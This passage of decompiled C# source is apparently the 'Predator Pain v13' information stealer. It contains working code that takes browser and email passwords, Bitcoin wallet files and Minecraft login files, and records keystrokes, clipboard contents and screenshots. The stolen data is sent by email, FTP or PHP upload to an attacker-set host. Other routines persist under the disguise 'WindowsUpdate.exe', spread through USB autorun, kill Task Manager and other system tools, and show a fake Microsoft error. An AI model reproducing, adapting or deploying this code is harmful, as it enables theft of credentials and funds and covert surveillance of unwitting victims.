		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				NetworkInterface networkInterface = array[num];
				if (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Loopback && networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return false;
		}
		return true;
	}

	public void Foldersinstall()
	{
		unHide();
		unhidden(Conversions.ToString(26));
		unhidden(Conversions.ToString(28));
		unhidden(Path.GetTempPath());
	}

	public void FakemsgInstall()
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(fakerror, "Disablefakerror", false) != 0 && Operators.CompareString(appname, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe", false) != 0)
		{
			MessageBox.Show(fakemgrstring, "Microsoft Application Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public void ServerInstall()
	{
		string text = Conversions.ToString(Conversions.ToDouble(timerstring) / 60000.0);
		string text2 = Conversions.ToString(DateTime.Now);
		string text3 = text2.Replace("/", ".");
		string text4 = ((Operators.CompareString(logger, "Disablelogger", false) == 0) ? "False" : "True");
		string text5 = ((Operators.CompareString(clip, "Disableclip", false) == 0) ? "False" : "True");
		string text6 = ((Operators.CompareString(stealers, "Disablestealers", false) == 0) ? "False" : "True");
		string text7 = "This is an email notifying you that " + ((ServerComputer)MyProject.Computer).get_Name() + " has ran your logger and emails should be sent to you shortly and at interval choosen.\r\n \r\nPredator Logger Details: \r\nServer Name: " + appname + "\r\nKeylogger Enabled: " + text4 + "\r\nClipboard-Logger Enabled: " + text5 + "\r\nTime Logs will be delivered: Every " + text + " minutes\r\n \r\nStealers Enabled: " + text6 + "\r\nTime Log will be delivered: Average 2 to 4 minutes\r\n \r\nLocal Date and Time: " + Conversions.ToString(((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime()) + "\r\nInstalled Language: " + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().ToString() + "\r\nOperating System: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "\r\nInternal IP Address: " + InternalIp + "\r\nExternal IP Address: " + ExIP + "\r\nInstalled Anti-Virus: " + MyAV + "\r\nInstalled Firewall: " + MyFirewall;
		if (!IsConnectedToInternet() || Operators.CompareString(notify, "Disablenotify", false) == 0)
		{
			return;
		}
		if (Operators.CompareString(useftp, "noftp", false) != 0)
		{
			try
			{
				UploadFTP("Predator_Painv13_Notification_" + ((ServerComputer)MyProject.Computer).get_Name() + " " + text3 + ".txt", text7);
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(usephp, "nophp", false) != 0)
		{
			try
			{
				UploadPHP("Predator_Painv13_Notification_" + ((ServerComputer)MyProject.Computer).get_Name() + " " + text3 + ".txt", text7);
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			MailMessage mailMessage = new MailMessage();
			SmtpClient smtpClient = new SmtpClient(smtpstring);
			mailMessage.From = new MailAddress(emailstring);
			mailMessage.To.Add(emailstring);
			mailMessage.Subject = "Predator Pain v13 - Server Ran - [" + ((ServerComputer)MyProject.Computer).get_Name() + "]";
			mailMessage.Body = text7;
			smtpClient.Port = Conversions.ToInteger(portstring);
			smtpClient.EnableSsl = ((Operators.CompareString(DisableSSL, "EnableSSL", false) != 0) ? true : false);
			smtpClient.Credentials = new NetworkCredential(emailstring, passstring);
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void unHide()
	{
		try
		{
			string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
			((ServerComputer)MyProject.Computer).get_Registry().SetValue(text, "Hidden", (object)"1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void unhidden(string path)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			directoryInfo.Attributes = FileAttributes.Normal;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Spread()
	{
		while (true)
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					if (driveInfo.DriveType == DriveType.Removable)
					{
						using (StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf"))
						{
							streamWriter.WriteLine("[autorun]");
							streamWriter.WriteLine("open=Sys.exe");
							streamWriter.WriteLine("action=Run win32");
							streamWriter.Close();
						}
						File.Copy(Application.get_ExecutablePath(), driveInfo.Name + "Sys.exe", overwrite: true);
						File.SetAttributes(driveInfo.Name + "autorun.inf", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
						File.SetAttributes(driveInfo.Name + "Sys.exe", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			Thread.Sleep(5000);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void addtostartup()
	{
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe"))
		{
			FileSystem.FileCopy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe");
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Windows Update", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe", RegistryValueKind.String);
		}
	}

	public string DES_Decrypt(string input, string pass)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[8];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.Unicode.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 8);
			dESCryptoServiceProvider.Key = array;
			dESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = dESCryptoServiceProvider.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			text = Encoding.Unicode.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string olddesdc(string input, string pass)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[8];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 8);
			dESCryptoServiceProvider.Key = array;
			dESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = dESCryptoServiceProvider.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void run(byte[] run)
	{
		object? obj = Assembly.Load(mem).CreateInstance("CMemoryExecute");
		object[] array = new object[2] { run, "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe" };
		bool[] array2 = new bool[2] { true, false };
		object obj2 = NewLateBinding.LateGet(obj, (Type)null, "Run", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			run = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
		}
		_ = (Assembly)obj2;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void StartStealers()
	{
		Mail = Resources.mailpv;
		Thread.Sleep(1000);
		WB = Resources.WebBrowserPassView;
		Thread.Sleep(2000);
		Thread thread = new Thread(stealMail);
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		Thread.Sleep(10000);
		Thread thread2 = new Thread(stealWebroswers);
		thread2.SetApartmentState(ApartmentState.STA);
		thread2.Start();
		Thread.Sleep(10000);
		checked
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("bitcoin");
				int num = processesByName.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					processesByName[i].Kill();
				}
				Thread.Sleep(5000);
				if (File.Exists(Interaction.Environ("AppData") + "\\bitcoin\\wallet.dat"))
				{
					FileSystem.FileCopy(Interaction.Environ("AppData") + "\\bitcoin\\wallet.dat", Path.GetTempPath() + ((ServerComputer)MyProject.Computer).get_Name() + "_wallet.dat");
					FileSystem.FileCopy(Interaction.Environ("AppData") + "\\bitcoin\\wallet.dat", Path.GetTempPath() + "wallet.dat");
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread thread3 = new Thread(Bitcoinsub);
			thread3.SetApartmentState(ApartmentState.STA);
			thread3.Start();
		}
	}

	public void stealMail()
	{
		try
		{
			object? obj = Assembly.Load(Resources.CMemoryExecute).CreateInstance("CMemoryExecute");
			object[] array = new object[3]
			{
				Mail,
				Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"),
				"/stext \"" + path + "holdermail.txt\""
			};
			bool[] array2 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Run", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				Mail = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			WaitUntilFileIsAvailable(path + "holdermail.txt");
			CleanedPasswordsMAIL = File.ReadAllText(path + "holdermail.txt");
			File.Delete(path + "holdermail.txt");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void stealWebroswers()
	{
		if (WB == null)
		{
			Holder = "                                 **********************************************\r\n                                      Operating System Intel Recovery\r\n                                 **********************************************\r\nCPU Name: " + ((ServerComputer)MyProject.Computer).get_Name() + "\r\nLocal Date and Time: " + Conversions.ToString(((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime()) + "\r\nInstalled Language: " + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().ToString() + "\r\nNet Version: " + Environment.Version.ToString() + "\r\nOperating System Platform: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSPlatform() + "\r\nOperating System Version: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSVersion() + "\r\nOperating System: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "\r\nInternal IP Address: " + InternalIp + "\r\nExternal IP Address: " + ExIP + "\r\nInstalled Anti-Virus: " + MyAV + "\r\nInstalled Firewall: " + MyFirewall + "\r\n                                 **********************************************\r\n                                      WEB Browser Password Recovery\r\n                                 **********************************************\r\n" + CleanedPasswordsWB + "\r\n                                 **********************************************\r\n                                    Mail Messenger Password Recovery\r\n                                 **********************************************\r\n" + CleanedPasswordsMAIL + "\r\n                                 **********************************************\r\n                                    Internet Download Manager Recovery\r\n                                 **********************************************\r\n                                 **********************************************\r\n                                      Jdownloader Password Recovery\r\n                                 **********************************************";
			Thread.Sleep(5000);
			string text = Conversions.ToString(DateTime.Now);
			string text2 = text.Replace("/", ".");
			if (IsConnectedToInternet())
			{
				if (Operators.CompareString(useftp, "noftp", false) != 0)
				{
					try
					{
						UploadFTP("Predator_Painv13_Stealer_Log_" + ((ServerComputer)MyProject.Computer).get_Name() + " " + text2 + ".txt", Holder);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(usephp, "nophp", false) != 0)
				{
					try
					{
						UploadPHP("Predator_Painv13_Stealer_Log_" + ((ServerComputer)MyProject.Computer).get_Name() + ".txt", Holder);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					try
					{
						MailMessage mailMessage = new MailMessage();
						SmtpClient smtpClient = new SmtpClient(smtpstring);
						mailMessage.From = new MailAddress(emailstring);
						mailMessage.To.Add(emailstring);
						mailMessage.Subject = "Predator Pain v13|Stealer Log - [" + ((ServerComputer)MyProject.Computer).get_Name() + "]";
						mailMessage.Body = Holder;
						smtpClient.Port = Conversions.ToInteger(portstring);
						smtpClient.EnableSsl = ((Operators.CompareString(DisableSSL, "EnableSSL", false) != 0) ? true : false);
						smtpClient.Credentials = new NetworkCredential(emailstring, passstring);
						smtpClient.Send(mailMessage);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		try
		{
			object? obj = Assembly.Load(Resources.CMemoryExecute).CreateInstance("CMemoryExecute");
			object[] array = new object[3]
			{
				WB,
				Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"),
				"/stext \"" + path + "holderwb.txt\""
			};
			bool[] array2 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Run", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				WB = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			WaitUntilFileIsAvailable(path + "holderwb.txt");
			CleanedPasswordsWB = File.ReadAllText(path + "holderwb.txt");
			File.Delete(path + "holderwb.txt");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		Holder = "                                 **********************************************\r\n                                      Operating System Intel Recovery\r\n                                 **********************************************\r\nCPU Name: " + ((ServerComputer)MyProject.Computer).get_Name() + "\r\nLocal Date and Time: " + Conversions.ToString(((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime()) + "\r\nInstalled Language: " + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().ToString() + "\r\nNet Version: " + Environment.Version.ToString() + "\r\nOperating System Platform: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSPlatform() + "\r\nOperating System Version: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSVersion() + "\r\nOperating System: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "\r\nInternal IP Address: " + InternalIp + "\r\nExternal IP Address: " + ExIP + "\r\nInstalled Anti-Virus: " + MyAV + "\r\nInstalled Firewall: " + MyFirewall + "\r\n                                 **********************************************\r\n                                      WEB Browser Password Recovery\r\n                                 **********************************************\r\n" + CleanedPasswordsWB + "\r\n                                 **********************************************\r\n                                    Mail Messenger Password Recovery\r\n                                 **********************************************\r\n" + CleanedPasswordsMAIL + "\r\n                                 **********************************************\r\n                                    Internet Download Manager Recovery\r\n                                 **********************************************\r\n                                 **********************************************\r\n                                      Jdownloader Password Recovery\r\n                                 **********************************************";
		Thread.Sleep(5000);
		string text3 = Conversions.ToString(DateTime.Now);
		string text4 = text3.Replace("/", ".");
		if (!IsConnectedToInternet())
		{
			return;
		}
		if (Operators.CompareString(useftp, "noftp", false) != 0)
		{
			try
			{
				UploadFTP("Predator_Painv13_Stealer_Log_" + ((ServerComputer)MyProject.Computer).get_Name() + " " + text4 + ".txt", Holder);
				return;
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(usephp, "nophp", false) != 0)
		{
			try
			{
				UploadPHP("Predator_Painv13_Stealer_Log_" + ((ServerComputer)MyProject.Computer).get_Name() + ".txt", Holder);
				return;
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			MailMessage mailMessage2 = new MailMessage();
			SmtpClient smtpClient2 = new SmtpClient(smtpstring);
			mailMessage2.From = new MailAddress(emailstring);
			mailMessage2.To.Add(emailstring);
			mailMessage2.Subject = "Predator Pain v13|Stealer Log - [" + ((ServerComputer)MyProject.Computer).get_Name() + "]";
			mailMessage2.Body = Holder;
			smtpClient2.Port = Conversions.ToInteger(portstring);
			smtpClient2.EnableSsl = ((Operators.CompareString(DisableSSL, "EnableSSL", false) != 0) ? true : false);
			smtpClient2.Credentials = new NetworkCredential(emailstring, passstring);
			smtpClient2.Send(mailMessage2);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	private string readweb(string url)
	{
		try
		{
			WebClient webClient = new WebClient();
			Stream stream = webClient.OpenRead(url);
			StreamReader streamReader = new StreamReader(stream);
			return streamReader.ReadToEnd();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}

	private void WaitUntilFileIsAvailable(string Filename)
	{
		bool flag = false;
		while (!File.Exists(Filename) || !flag)
		{
			try
			{
				FileStream fileStream = File.OpenRead(Filename);
				fileStream.Close();
				flag = true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Application.DoEvents();
		}
	}

	public void Bitcoinsub()
	{
		Thread.Sleep(Bitcoinst);
		if (!IsConnectedToInternet())
		{
			return;
		}
		if (Operators.CompareString(useftp, "noftp", false) != 0)
		{
			try
			{
				if (File.Exists(Path.GetTempPath() + ((ServerComputer)MyProject.Computer).get_Name() + "_wallet.dat"))
				{
					UploadFTP(Path.GetTempPath() + ((ServerComputer)MyProject.Computer).get_Name() + "_wallet.dat");
				}
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(usephp, "nophp", false) == 0 && File.Exists(Path.GetTempPath() + "wallet.dat"))
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				SmtpClient smtpClient = new SmtpClient(smtpstring);
				mailMessage.From = new MailAddress(emailstring);
				mailMessage.To.Add(emailstring);
				mailMessage.Subject = "Pain File Stealer Bitcoin Stealer - [" + ((ServerComputer)MyProject.Computer).get_Name() + "]";
				mailMessage.Body = "Steals the Wallet.DAT file that holds the users bitcoin currency";
				mailMessage.Attachments.Add(new Attachment(Path.GetTempPath() + "wallet.dat"));
				smtpClient.Port = 587;
				smtpClient.EnableSsl = ((Operators.CompareString(DisableSSL, "EnableSSL", false) != 0) ? true : false);
				smtpClient.Credentials = new NetworkCredential(emailstring, passstring);
				smtpClient.Send(mailMessage);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public string DecompressString(string compressedText)
	{
		checked
		{
			try
			{
				byte[] array = Convert.FromBase64String(compressedText);
				using MemoryStream memoryStream = new MemoryStream();
				int num = BitConverter.ToInt32(array, 0);
				memoryStream.Write(array, 4, array.Length - 4);
				byte[] array2 = new byte[num - 1 + 1];
				memoryStream.Position = 0L;
				using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
				{
					gZipStream.Read(array2, 0, array2.Length);
				}
				return Encoding.UTF8.GetString(array2);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return null;
		}
	}

	public void Minecraftsub()
	{
		Thread.Sleep(Minecraftt);
		if (!IsConnectedToInternet())
		{
			return;
		}
		if (Operators.CompareString(useftp, "noftp", false) != 0)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin"))
				{
					UploadFTP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin");
				}
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (Operators.CompareString(usephp, "nophp", false) == 0 && File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin"))
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				SmtpClient smtpClient = new SmtpClient(smtpstring);
				mailMessage.From = new MailAddress(emailstring);
				mailMessage.To.Add(emailstring);
				mailMessage.Subject = "Predator Pain v13|Minecraft Stealer - [" + ((ServerComputer)MyProject.Computer).get_Name() + "]";
				mailMessage.Body = "There is a file attached to this email containing Minecraft username and password download it then decrypt the login information with my Minecraft Decryptor";
				mailMessage.Attachments.Add(new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin"));
				smtpClient.Port = Conversions.ToInteger(portstring);
				smtpClient.EnableSsl = ((Operators.CompareString(DisableSSL, "EnableSSL", false) != 0) ? true : false);
				smtpClient.Credentials = new NetworkCredential(emailstring, passstring);
				smtpClient.Send(mailMessage);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Disabler()
	{
		while (true)
		{
			if (Operators.CompareString(TaskManager, "DisableTaskManager", false) != 0)
			{
				Process[] processes = Process.GetProcesses();
				Process[] array = processes;
				foreach (Process process in array)
				{
					string processName = process.ProcessName;
					if (Operators.CompareString(processName, "Taskmgr", false) == 0)
					{
						process.Kill();
					}
				}
			}
			if (Operators.CompareString(TaskManager, "DisableTaskManager", false) != 0)
			{
				Process[] processes2 = Process.GetProcesses();
				Process[] array2 = processes2;
				foreach (Process process2 in array2)
				{
					string processName2 = process2.ProcessName;
					if (Operators.CompareString(processName2, "taskmgr", false) == 0)
					{
						process2.Kill();
					}
				}
			}
			if (Operators.CompareString(cmd, "Disablecmd", false) != 0)
			{
				Process[] processes3 = Process.GetProcesses();
				Process[] array3 = processes3;
				foreach (Process process3 in array3)
				{
					string processName3 = process3.ProcessName;
					if (Operators.CompareString(processName3, "cmd", false) == 0)
					{
						process3.Kill();
					}
				}
			}
			if (Operators.CompareString(misconfig, "Disablemsconfig", false) != 0)
			{
				Process[] processes4 = Process.GetProcesses();
				Process[] array4 = processes4;
				foreach (Process process4 in array4)
				{
					string processName4 = process4.ProcessName;
					if (Operators.CompareString(processName4, "msconfig", false) == 0)
					{
						process4.Kill();
					}
				}
			}
			if (Operators.CompareString(reg, "Disablereg", false) != 0)
			{
				Process[] processes5 = Process.GetProcesses();
				Process[] array5 = processes5;
				foreach (Process process5 in array5)
				{
					string processName5 = process5.ProcessName;
					if (Operators.CompareString(processName5, "regedit", false) == 0)
					{
						process5.Kill();
					}
				}
			}
			if (Operators.CompareString(startup, "Disablestartup", false) != 0)
			{
				addtostartup();
			}
			Thread.Sleep(200);
		}
	}

	public void SendLogs()
	{
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Expected O, but got Unknown
		checked
		{
			while (true)
			{
				Thread.Sleep(Conversions.ToInteger(timerstring));
				if (string.IsNullOrEmpty(KeyLog.Trim()) || !IsConnectedToInternet())
				{
					continue;
				}
				lock (KeyLog)
				{
					lock (CLog)
					{
						try
						{
							MailMessage mailMessage = new MailMessage();
							SmtpClient smtpClient = new SmtpClient(smtpstring);
							mailMessage.From = new MailAddress(emailstring);
							mailMessage.To.Add(emailstring);
							mailMessage.Subject = "Predator Pain v13 - Key Recorder - [" + ((ServerComputer)MyProject.Computer).get_Name() + "]";
							mailMessage.Body = "                                 **********************************************\r\n                                                  ClipBoard Log\r\n                                 **********************************************\r\n" + CLog + "\r\n                                 **********************************************\r\n                                                  Keylogger Log\r\n                                 **********************************************\r\n" + KeyLog;
							if (Operators.CompareString(screeny, "Disablescreeny", false) != 0)
							{
								if (!Directory.Exists(Path.GetTempPath() + "screens"))
								{
									Directory.CreateDirectory(Path.GetTempPath() + "screens");
								}
								Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
								Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
								Graphics val2 = Graphics.FromImage((Image)(object)val);
								Point point = new Point(0, 0);
								Point point2 = new Point(0, 0);
								val2.CopyFromScreen(point, point2, size);
								((Image)val).Save(Path.GetTempPath() + "screens\\screenshot" + Conversions.ToString(screenynumber) + ".jpeg");
								mailMessage.Attachments.Add(new Attachment(Path.GetTempPath() + "screens\\screenshot" + Conversions.ToString(screenynumber) + ".jpeg"));
								screenynumber++;
							}
							smtpClient.Port = Conversions.ToInteger(portstring);
							smtpClient.EnableSsl = ((Operators.CompareString(DisableSSL, "EnableSSL", false) != 0) ? true : false);
							smtpClient.Credentials = new NetworkCredential(emailstring, passstring);
							smtpClient.Send(mailMessage);
							KeyLog = string.Empty;
							CLog = string.Empty;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
		}
	}

	public void SendLogsFTP()
	{
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Expected O, but got Unknown
		int num = 0;
		checked
		{
			while (true)
			{
				Thread.Sleep(Conversions.ToInteger(timerstring));
				if (string.IsNullOrEmpty(KeyLog.Trim()) || !IsConnectedToInternet())
				{
					continue;
				}
				num++;
				lock (KeyLog)
				{
					lock (CLog)
					{
						try
						{
							string data = "                                 **********************************************\r\n                                                  ClipBoard Log\r\n                                 **********************************************\r\n" + CLog + "\r\n                                 **********************************************\r\n                                                  Keylogger Log\r\n                                 **********************************************\r\n" + KeyLog;
							string text = Conversions.ToString(DateTime.Now);
							string text2 = text.Replace("/", ".");
							UploadFTP("Predator_Pain_v13_KeyLog_" + Conversions.ToString(num) + "_" + ((ServerComputer)MyProject.Computer).get_Name() + " " + text2 + ".txt", data);
							if (Operators.CompareString(screeny, "Disablescreeny", false) != 0)
							{
								if (!Directory.Exists(Path.GetTempPath() + "screens"))
								{
									Directory.CreateDirectory(Path.GetTempPath() + "screens");
								}
								Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
								Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
								Graphics val2 = Graphics.FromImage((Image)(object)val);
								Point point = new Point(0, 0);
								Point point2 = new Point(0, 0);
								val2.CopyFromScreen(point, point2, size);
								((Image)val).Save(Path.GetTempPath() + "screens\\screenshot" + Conversions.ToString(screenynumber) + "_" + ((ServerComputer)MyProject.Computer).get_Name() + ".jpeg");
								UploadFTP(Path.GetTempPath() + "screens\\screenshot" + Conversions.ToString(screenynumber) + "_" + ((ServerComputer)MyProject.Computer).get_Name() + ".jpeg");
								screenynumber++;
							}
							KeyLog = string.Empty;
							CLog = string.Empty;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
		}
	}

	public void UploadFTP(string Filename, string Data)
	{
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + ftphost + "/" + Filename);
		ftpWebRequest.Credentials = new NetworkCredential(ftpuser, ftppass);
		ftpWebRequest.Method = "STOR";
		Stream requestStream = ftpWebRequest.GetRequestStream();
		using (BinaryWriter binaryWriter = new BinaryWriter(requestStream))
		{
			binaryWriter.Write(Data);
		}
		requestStream.Close();
		requestStream.Dispose();
	}

	public void UploadFTP(string Filename)
	{
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + ftphost + "/" + Path.GetFileName(Filename));
		ftpWebRequest.Credentials = new NetworkCredential(ftpuser, ftppass);
		ftpWebRequest.Method = "STOR";
		byte[] array = File.ReadAllBytes(Filename);
		Stream requestStream = ftpWebRequest.GetRequestStream();
		requestStream.Write(array, 0, array.Length);
		requestStream.Close();
		requestStream.Dispose();
	}

	public void SendLogsPHP()
	{
		int num = 0;
		while (true)
		{
			Thread.Sleep(Conversions.ToInteger(timerstring));
			if (string.IsNullOrEmpty(KeyLog.Trim()) || !IsConnectedToInternet())
			{
				continue;
			}
			num = checked(num + 1);
			lock (KeyLog)
			{
				lock (CLog)
				{
					try
					{
						string data = "                                 **********************************************\r\n                                                  ClipBoard Log\r\n                                 **********************************************\r\n" + CLog + "\r\n                                 **********************************************\r\n                                                  Keylogger Log\r\n                                 **********************************************\r\n" + KeyLog;
						string text = Conversions.ToString(DateTime.Now);
						string text2 = text.Replace("/", ".");
						UploadPHP("Predator_Pain_v13_KeyLog_" + Conversions.ToString(num) + "_" + ((ServerComputer)MyProject.Computer).get_Name() + " " + text2 + ".txt", data);
						KeyLog = string.Empty;
						CLog = string.Empty;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void UploadPHP(string Filename, string Data)
	{
		WebClient webClient = new WebClient();
